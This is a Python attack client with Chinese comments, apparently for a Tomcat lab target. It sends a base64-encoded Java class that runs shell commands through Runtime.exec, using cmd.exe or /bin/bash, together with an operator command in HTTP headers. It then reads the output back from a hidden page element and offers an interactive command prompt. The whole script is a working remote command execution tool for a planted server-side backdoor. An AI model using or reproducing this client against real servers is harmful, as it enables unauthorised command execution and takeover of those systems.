#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64, gzip, re, sys, urllib.request

URL = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1/'
ARG = sys.argv[2] if len(sys.argv) > 2 else None
MARKER = 'pack-diag'

# 实验环境直连, 禁用系统代理(Windows 下 urllib 默认跟随系统代理, 127.0.0.1 会被拦)
_opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))

def fetch(data=None, headers=None):
    req = urllib.request.Request(URL, data=data, headers=headers or {})
    return _opener.open(req, timeout=30).read()

def out(html):
    m = re.search((r'<(?:div|span) id="%s"[^>]*>([^<]*)<' % MARKER).encode(), html)
    if not m:
        sys.exit('隐藏容器未找到')
    return m.group(1).decode()

def run_once(cmd):
    CLS = 'yv66vgAAADQAZgoAGwAvCAAwCwAxADIKABIAMwgANAoAGgA1CAA2CAA3CgA4ADkKABIAOggAOwoAEgA8CAA9CAA+CAA/CABACgBBAEIHAEMKAEEARAoARQBGBwBHCgAVAC8KAEgASQoAFQBKCgAVAEsHAEwHAE0BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAEZXhlYwEAOyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAQwEACkV4Y2VwdGlvbnMHAE4BAANydW4BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7BwBPBwBQBwBHBwBRAQAKU291cmNlRmlsZQEADFBheWxvYWQuamF2YQwAHAAdAQAFWC1SdW4HAFIMAFMAKAwAVABVAQAFbm8tb3AMACYAKAEADGlkOyB1bmFtZSAtYQEAB29zLm5hbWUHAFYMAFcAKAwAWAAnAQADd2luDABZAFoBAAdjbWQuZXhlAQAJL2Jpbi9iYXNoAQACL2MBAAItYwcAWwwAXABdAQAQamF2YS9sYW5nL1N0cmluZwwAIABeBwBPDABfAGABAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcAUAwAYQBiDABjAGQMAGUAJwEAB1BheWxvYWQBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAAltCAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEACWdldEhlYWRlcgEAB2lzRW1wdHkBAAMoKVoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAARyZWFkAQAFKFtCKUkBAAV3cml0ZQEAByhbQklJKVYBAAh0b1N0cmluZwAhABoAGwAAAAAABAABABwAHQABAB4AAAAdAAEAAQAAAAUqtwABsQAAAAEAHwAAAAYAAQAAABMAAQAgACEAAgAeAAAATwACAAMAAAAcKxICuQADAgBNLMYACiy2AASZAAYSBbAsuAAGsAAAAAIAHwAAABIABAAAABcACQAYABQAGQAXABsAIgAAAAkAAvwAFAcAIwIAJAAAAAQAAQAlAAEAJgAnAAIAHgAAAB4AAQABAAAABhIHuAAGsAAAAAEAHwAAAAYAAQAAACAAJAAAAAQAAQAlAAoAJgAoAAIAHgAAAOgABQAJAAAAdRIIuAAJtgAKEgu2AAw8G5kACBINpwAFEg5NG5kACBIPpwAFEhBOuAARBr0AElkDLFNZBC1TWQUqU7YAEzoEGQS2ABQ6BbsAFVm3ABY6BhECALwIOgcZBRkHtgAXWTYIngAQGQYZBwMVCLYAGKf/6RkGtgAZsAAAAAIAHwAAACYACQAAACUADgAmABoAJwAmACgAPgApAEUAKgBOACsAVQAtAG8ALgAiAAAANQAG/AAXAUEHACP8AAkHACNBBwAj/wAvAAgHACMBBwAjBwAjBwApBwAqBwArBwAsAAD8ABkBACQAAAAEAAEAJQABAC0AAAACAC4='
    packed = base64.b64encode(gzip.compress(base64.b64decode(CLS))).decode()
    headers = {
        'X-Pack': packed,
        'X-Run': cmd,
        'Referer': URL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    d = out(fetch(headers=headers))
    if not d:
        sys.exit('服务端无回显(若一直如此, 检查 Tomcat 的 JDK 版本: JDK16+ 默认强封装会阻断反射 defineClass)')
    return base64.b64decode(d).decode('utf-8', 'replace')

if __name__ == '__main__':
    if ARG is not None:
        print(run_once(ARG))
    else:
        print('[交互模式] 目标:', URL, '| 输入命令回车执行, exit 退出')
        while True:
            try:
                line = input('cmd> ').strip()
            except (EOFError, KeyboardInterrupt):
                print(); break
            if not line: continue
            if line.lower() in ('exit', 'quit'): break
            try:
                print(run_once(line))
            except SystemExit as e:
                print('[!]', e)
            except Exception as e:
                print('[!]', e)
